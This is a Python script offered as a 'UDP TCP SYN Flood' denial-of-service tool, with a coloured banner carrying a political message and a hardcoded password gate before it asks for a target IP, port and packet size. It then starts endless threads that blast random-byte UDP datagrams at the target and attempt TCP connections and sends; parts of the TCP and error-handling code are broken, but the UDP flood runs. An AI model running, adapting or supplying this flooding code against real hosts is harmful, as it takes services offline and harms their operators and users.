#!/usr/bin/env python

import os
import threading
import sys
import time
import random
import socket

attemps = 0
os.system("clear")
print("""
            █┐ █┐                   \033[38;5;39m█\033[33m┐
   ╭████┐   █│ █│                   \033[38;5;39m█\033[33m│
   █╭─╭████┐█│ █│ ╭████┐\033[38;5;206m █████\033[36m╮\033[33m ╭\033[38;5;39m████\033[33m│\033[37m █\033[38;5;206m┐\033[37m███\033[38;5;206m┐\033[37m  ╭\033[38;5;220m████\033[37m┐
   █│ █╭──█│█│ █│ █╭──█│\033[38;5;206m █\033[36m╭──\033[38;5;206m█\033[36m│\033[38;5;39m █\033[33m╭──\033[38;5;39m█\033[33m│\033[37m ██\033[38;5;206m╭──\033[37m█\033[38;5;206m┘\033[38;5;220m █\033[37m╭──\033[38;5;220m█\033[37m│
\033[35m   █│ █│  █│█│ █│ █│  █│\033[38;5;206m █\033[36m│\033[38;5;206m  █\033[36m│\033[38;5;39m █\033[33m│\033[38;5;39m  █\033[33m│\033[37m █\033[38;5;206m│\033[38;5;220m      █\033[37m│ \033[38;5;220m █\033[37m│
\033[35m   █│ █│  █│█│ █│ █│  █│\033[38;5;206m █\033[36m│\033[38;5;206m  █\033[36m│\033[38;5;39m █\033[33m│\033[38;5;39m  █\033[33m│\033[37m █\033[38;5;206m│\033[38;5;220m      █\033[37m│ \033[38;5;220m █\033[37m│
   █│ █│  █│█│ █│ █│  █│\033[38;5;206m █\033[36m│\033[38;5;206m  █\033[36m│\033[38;5;39m █\033[33m│\033[38;5;39m  █\033[33m│\033[37m █\033[38;5;206m│\033[38;5;220m      █\033[37m│ \033[38;5;220m █\033[37m│
\033[92m   █│  ████│█│ █│  ████│\033[38;5;206m █\033[36m│\033[38;5;206m  █\033[36m│\033[38;5;39m  ████\033[33m│\033[37m █\033[38;5;206m│\033[38;5;220m       ████\033[37m│
   \033[92m ████┐──┘█│ █│  ╰───┘\033[36m ╰┘  ╰┘\033[33m  ╰───┘\033[38;5;206m ╰┘\033[37m       ╰───┘
   \033[37m ╰───┘   ╰┘ ╰┘
\033[38;5;220m ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
\033[38;5;220m │\033[48;5;1m                Z'Black Collaborates               \033[48;5;1m\033[0m│
\033[38;5;220m │\033[48;5;1m        with fighters justice for Palestine        \033[48;5;1m\033[0m│
\033[38;5;220m ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯""")
while attemps < 100:
    username = input("\033[48;5;7m\033[31mScrip iki jenenge opo?\033[0m:\033[30m")
    password = input("\033[48;5;7m\033[31mGemboke piro?. . . . .\033[0m:\033[30m")

    if username == 'callandra' and password == '1sampe6':
        print("\033[33m Alhamdulillah...kebuka juga 😁 [✓]\033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
if len(sys.argv) < 4:
    print("UDP TCP SYN Flood")
    sys.exit("Usage: python "+sys.argv[0]+" [ip] [port] [size]")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])

class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
                print(f"\033[38;5;220m" +ip+ " \033[38;5;37m" +str(self)+ "\033[31m80")
                print(f"\033[38;5;154m" +ip+ " \033[37m" +str(self)+ "\033[34m80")
            except:
                pass

class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass

class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")
        u = udp(ip,port,size,packets)
        t = tcp(ip,port,size,packets)
        s = syn(ip,port,packets)
        u.start()
        t.start()
        s.start()
    except KeyboardInterrupt:
        print("Stopping Flood!")
        sys.exit()
    except (socket.error, msg):
        print("Socket Couldn't Connect")
        sys.exit()
